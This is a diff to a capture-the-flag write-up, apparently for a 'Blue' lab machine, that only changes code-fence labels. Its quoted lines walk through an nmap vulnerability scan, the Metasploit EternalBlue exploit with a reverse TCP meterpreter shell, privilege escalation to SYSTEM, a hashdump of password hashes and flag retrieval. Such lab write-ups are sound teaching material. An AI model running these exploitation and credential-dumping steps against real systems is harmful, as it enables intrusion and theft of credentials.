@@ -43,7 +43,7 @@ sudo nmap -sV -sC --script vuln -oN /tmp/blue_nmap_scan $IP
 
 This scan takes a bit more time as it will check for know vulnerabilities. As following the output of the `nmap` scan:
 
-```
+```commandline
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-11 02:37 CEST
 Pre-scan script results:
 | broadcast-avahi-dos: 
@@ -148,7 +148,7 @@ _Exploit the machine and gain a foothold._
 
 Starting up `Metasploit` with the command `sudo msfconsole`.  Once loaded, I did a search on `ms17-010` with the search command:
 
-```
+```commandline
 msf6 > search ms17-010
 
 Matching Modules
@@ -167,7 +167,7 @@ Interact with a module by name or index. For example info 4, use 4 or use exploi
 
 Interested in the first (`#0`) item in this search result. So I wanted to make use of it with:
 
-```
+```commandline
 msf6 > use 0
 [*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
 msf6 exploit(windows/smb/ms17_010_eternalblue) >
@@ -177,7 +177,7 @@ _Note that you can `use` the full name of the matching module (`use exploit/wind
 
 From there on, we need to see which options we need to set with the `show options` command:
 
-```
+```commandline
 msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
 
 Module options (exploit/windows/smb/ms17_010_eternalblue):
@@ -213,7 +213,7 @@ Exploit target:
 
 The 2 very important options we need to set before proceeding to the next step is changing the variables of `RHOSTS` and `LHOST`. The rest of the options I left as is:
 
-```
+```commandline
 set RHOSTS 10.10.19.224
 set LHOST tun0
 ```
@@ -222,7 +222,7 @@ Note that here I have set `LHOST` to `tun0`, which is my VPN network device conn
 
 Finally, execute the exploit with the `run`  or `exploit` command. `exploit` is an alias to `run`:
 
-```
+```commandline
 msf6 exploit(windows/smb/ms17_010_eternalblue) > run
 
 [*] Started reverse TCP handler on 10.8.208.30:4444 
@@ -290,7 +290,7 @@ _Escalate privileges, learn how to upgrade shells in metasploit._
 
 We can get confirmation with the `getsystem` and `getuid` commands:
 
-```
+```commandline
 meterpreter > getsystem 
 ...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
 meterpreter > getuid
@@ -301,7 +301,7 @@ So we have the user rights of `NT AUTHORITY\SYSTEM` which is perfect.
 
 We can also check with the `getpid` and `ps` commands, and we see that the exploit has been migrated to a very stable `spoolsv.exe` process. The `spoolsv.exe` is a very stable and fast process. In the worst case, if that process crash, it automatically restarts, and we have back control of the target machine:
 
-```
+```commandline
 meterpreter > getpid
 Current pid: 1312
 meterpreter > ps
@@ -384,7 +384,7 @@ _Dump the non-default user's password and crack it!_
 
 Dumping the hash password database can be simply done with the `hashdump` command:
 
-```
+```commandline
 meterpreter > hashdump
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
@@ -433,7 +433,7 @@ To accomplish this without guidance, requires a bit of researches on the system 
 
 The first, `flag1.txt` is located on the root of the `C:` drive:
 
-```
+```commandline
 meterpreter > pwd
 C:\Windows\system32
 meterpreter > cd c:\\
@@ -445,7 +445,7 @@ flag{access_the_machine}
 
 The second, `flag2.txt` is stored in the `C:\windows\system32\config`:
 
-```
+```commandline
 meterpreter > pwd                                          
 c:\
 meterpreter > cd c:\\windows\\system32\\config
@@ -455,7 +455,7 @@ flag{sam_database_elevated_access}
 
 The last, `flag3.txt` is stored in `C:\Users\Jon\Documents `:
 
-```
+```commandline
 meterpreter > pwd
 c:\windows\system32\config
 meterpreter > cd c:\\Users\\Jon\\Documents 
